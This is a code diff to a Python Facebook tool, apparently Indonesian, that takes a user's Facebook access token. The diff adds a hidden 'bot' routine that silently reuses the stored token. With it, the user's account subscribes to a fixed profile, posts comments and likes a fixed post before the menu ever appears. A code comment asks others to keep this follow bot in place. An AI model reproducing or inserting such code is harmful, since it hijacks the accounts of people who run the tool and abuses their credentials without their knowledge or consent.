@@ -58,6 +58,11 @@ def banner():
 """%(N))                                                    
 
 class login:
+
+	def __init__(self):
+		self.ada = []
+	def __login__(self):
+		os.system('clear')
 		banner()
 		token = input(' [*] Masukan token : ')
 		if token in ['']:
@@ -66,8 +71,8 @@ class login:
 			try:
 				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
 				open('token.x','w').write(token)
-				print('\n [+] Login berhasil')
-				self.menu()
+				print('\n [+] Login berhasil' )
+				self.bot()
 			except KeyError:
 				jalan(' [!] Token error coba ganti akun tumbal!')
 				self.takon()
@@ -78,6 +83,21 @@ class login:
 			os.system('xdg-open wa.me/62895386194665')
 		else:
 			login().__login__()
+	def bot(self):
+		# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
+		try:
+			toket = open('token.x','r').read()
+		except IOError:
+			jalan('\n [!] Token mokad ganti akun!');time.sleep(1);login().__login__()
+		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/100006414900732/comments/?message=' +komen+ '&access_token=' + toket)
+		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/3086614624895671/comments/?message='+komen+'&access_token=' + toket)
+		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
+		os.system('xdg-open wa.me/6285772148224')
+		menu().main()
 		
 def menu():
 	try:sh = requests.get('https://httpbin.org/ip').json()
